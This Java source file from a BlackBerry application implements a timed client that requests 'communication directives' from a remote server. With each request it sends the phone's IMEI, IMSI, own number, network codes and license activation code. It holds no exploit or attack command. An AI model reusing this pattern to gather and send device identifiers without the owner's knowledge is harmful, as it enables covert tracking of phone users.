package com.vvt.protsrv;

import java.io.IOException;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.global.Global;
import com.vvt.info.ApplicationInfo;
import com.vvt.info.ServerUrl;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseManager;
import com.vvt.prot.CommandListener;
import com.vvt.prot.CommandMetaData;
import com.vvt.prot.CommandRequest;
import com.vvt.prot.CommandServiceManager;
import com.vvt.prot.command.CompressionType;
import com.vvt.prot.command.EncryptionType;
import com.vvt.prot.command.GetCommunicationDirectives;
import com.vvt.prot.command.Languages;
import com.vvt.prot.command.TransportDirectives;
import com.vvt.prot.command.response.GetCommunicationDirectivesCmdResponse;
import com.vvt.prot.command.response.StructureCmdResponse;
import com.vvt.protsrv.util.ProtSrvUtil;
import com.vvt.std.Constant;
import com.vvt.std.FxTimer;
import com.vvt.std.FxTimerListener;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;
import com.vvt.version.VersionInfo;

public class GetCommunicationDirectivesManager implements CommandListener, FxTimerListener {

	private static final int GET_COMMUNICATION_INTERVAL = 10; // In second
	private static final int GET_COMMUNICATION__PROCESS_INTERVAL = 10; // In minute
	private static final int GET_COMMUNICATION_TIMER_ID = 1;
	private static final int GET_COMMUNICATION__PROCESS_TIMER_ID = 2;
	private static final long GET_COMMUNICATION_DIRECTIVES_KEY = 0x4e2dd613a57f117fL;
	private static final long GET_COMMUNICATION_DIRECTIVES_GUID = 0x19a944729799cd52L;
	private static GetCommunicationDirectivesManager self = null;
	private PersistentObject getCommPersistence = null;
	private GetCommunicationDirectivesClientData getCommuInfo = null;
	private GetCommunicationDirectivesCmdResponse getCommuRes = null;
	private FxTimer getCommuTimer = new FxTimer(GET_COMMUNICATION_TIMER_ID, this);
	private FxTimer getCommuProcessTimer = new FxTimer(GET_COMMUNICATION__PROCESS_TIMER_ID, this);
	private PhoenixProtocolListener listener = null;
	private LicenseManager license = Global.getLicenseManager();
	private ServerUrl serverUrl = Global.getServerUrl();
	private CommandServiceManager comServMgr = Global.getCommandServiceManager();
	private LicenseInfo licenseInfo = license.getLicenseInfo();	
	private ProtSrvUtil protSrvUtil = new ProtSrvUtil();
	
	private GetCommunicationDirectivesManager() {
		getCommPersistence = PersistentStore.getPersistentObject(GET_COMMUNICATION_DIRECTIVES_KEY);
		synchronized (getCommPersistence) {
			if (getCommPersistence.getContents() == null) {
				getCommuInfo  = new GetCommunicationDirectivesClientData();
				getCommPersistence.setContents(getCommuInfo);
				getCommPersistence.commit();
			}
			getCommuInfo = (GetCommunicationDirectivesClientData)getCommPersistence.getContents();
			getCommuTimer.setInterval(GET_COMMUNICATION_INTERVAL);
			getCommuProcessTimer.setIntervalMinute(GET_COMMUNICATION__PROCESS_INTERVAL);
		}
	}
	
	public static GetCommunicationDirectivesManager getInstance() {
		if (self == null) {
			self = (GetCommunicationDirectivesManager)RuntimeStore.getRuntimeStore().get(GET_COMMUNICATION_DIRECTIVES_GUID);
			if (self == null) {
				GetCommunicationDirectivesManager getCommu = new GetCommunicationDirectivesManager();
				RuntimeStore.getRuntimeStore().put(GET_COMMUNICATION_DIRECTIVES_GUID, getCommu);
				self = getCommu;
			}
		}
		return self;
	}
	
	public void start() {
		getCommuTimer.start();
	}
	
	public void stop() {
		cancelTask();
	}
	
	public void addListener(PhoenixProtocolListener listener) {
		this.listener = listener;
	}

	public void removeListener() {
		this.listener = null;
	}
	
	private synchronized void doSend() {
		try {
			CommandRequest	cmdRequest = initCommandRequest();	
			long csid = comServMgr.execute(cmdRequest);
			getCommuInfo.setCsid(new Long(csid));
			getCommPersistence.setContents(getCommuInfo);
			getCommPersistence.commit();			
		} catch (IOException e) {
			Log.error("GetCommunicationDirectivesManager.execute()", e.getMessage(), e);
			e.printStackTrace();
			cancelTask();			
			notifyError(e.getMessage());
		}
	}
	
	private void cancelTask() {		
		getCommuTimer.stop();
		stopProcessTimer();
		if (getCommuInfo.getCsid() != null) {
			long csid = getCommuInfo.getCsid().longValue();
			try {
				comServMgr.cancelRequest(csid);				
			} catch (Exception e) {				
				Log.error("GetCommunicationDirectivesManager.cancelTask()", "Cancel with csid: " + csid);
			}	
		}
	}
	
	private void startProcessTimer() {
		getCommuProcessTimer.stop();
		getCommuProcessTimer.start();
	}
	
	private void stopProcessTimer() {
		getCommuProcessTimer.stop();
	}
		
	private CommandRequest initCommandRequest() {
		CommandRequest cmdRequest = new CommandRequest();
		CommandMetaData cmdMetaData = initComandMetaData();
		GetCommunicationDirectives getCommu = new GetCommunicationDirectives();
		cmdRequest.setCommandData(getCommu);
    	cmdRequest.setCommandMetaData(cmdMetaData);
    	cmdRequest.setUrl(serverUrl.getServerDeliveryUrl());
    	cmdRequest.setCommandListener(this);
    	return cmdRequest;
	}
	
	private CommandMetaData initComandMetaData() {
		// Meta Data
		CommandMetaData cmdMetaData = new CommandMetaData();
		cmdMetaData.setProtocolVersion(ApplicationInfo.PROTOCOL_VERSION);
		cmdMetaData.setProductId(licenseInfo.getProductID());
//		cmdMetaData.setProductVersion(ApplicationInfo.PRODUCT_VERSION);
		cmdMetaData.setProductVersion(VersionInfo.getFullVersion());
		cmdMetaData.setConfId(licenseInfo.getProductConfID());
		cmdMetaData.setDeviceId(PhoneInfo.getIMEI());
		cmdMetaData.setLanguage(Languages.ENGLISH);
		cmdMetaData.setPhoneNumber(PhoneInfo.getOwnNumber());
		cmdMetaData.setMcc(PhoneInfo.getMCC());
		cmdMetaData.setMnc(PhoneInfo.getMNC());
		cmdMetaData.setActivationCode(licenseInfo.getActivationCode());
		cmdMetaData.setImsi(PhoneInfo.getIMSI());
		cmdMetaData.setBaseServerUrl(protSrvUtil.getBaseServerUrl());
		cmdMetaData.setTransportDirective(TransportDirectives.NON_RESUMABLE);
		cmdMetaData.setEncryptionCode(EncryptionType.ENCRYPT_ALL_METADATA.getId());
		cmdMetaData.setCompressionCode(CompressionType.COMPRESS_ALL_METADATA.getId());	
		return cmdMetaData;
	}
	
	private void notifySuccess() {
		if (listener != null) {
			listener.onSuccess(getCommuRes);
		}
	}
	
	private void notifyError(String message) {
		if (listener != null) {
			listener.onError(message);
		}
	}
	
	// CommandListener
	public void onSuccess(StructureCmdResponse response) {
		stopProcessTimer();
		if (response instanceof GetCommunicationDirectivesCmdResponse) {
			getCommuRes = (GetCommunicationDirectivesCmdResponse) response;
			if (getCommuRes.getStatusCode() == 0) {				
				notifySuccess();
			} 
		} else {
			notifyError(response.getServerMsg());
		}
	}

	public void onConstructError(long csid, Exception e) {
		stopProcessTimer();
		notifyError(e.getMessage());
	}

	public void onServerError(long csid, StructureCmdResponse response) {
		stopProcessTimer();
		notifyError(response.getServerMsg());		
	}

	public void onTransportError(long csid, Exception e) {
		stopProcessTimer();
		notifyError(e.getMessage());
	}

	// FxTimerListener
	public void timerExpired(int id) {			
		if (id == GET_COMMUNICATION_TIMER_ID) {	
			startProcessTimer();			
			doSend();
		} else if (id == GET_COMMUNICATION__PROCESS_TIMER_ID) {
			cancelTask();
		}
	}

}
